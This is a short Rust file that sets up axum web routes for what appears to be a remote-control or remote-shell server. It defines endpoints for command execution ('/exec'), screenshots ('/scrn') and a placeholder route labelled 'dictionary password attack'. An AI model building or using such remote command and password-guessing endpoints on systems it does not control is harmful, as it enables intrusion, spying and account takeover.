mod exec;
mod scrn;

use crate::ShellState;
use axum::{
    routing::{get, post},
    Extension, Router,
};
use std::sync::{Arc, Mutex};

pub fn all_routes(shellpath: Arc<Mutex<ShellState>>) -> Router {
    Router::new()
        .route("/", get("login with username and password"))
        .route("/set", get("update username & password"))
        .route("/pswd", post("dictionary password attack"))
        .route("/exec", post(exec::exec_cmd))
        .route("/scrn", post(scrn::screenshot))
        .layer(Extension(shellpath))
}
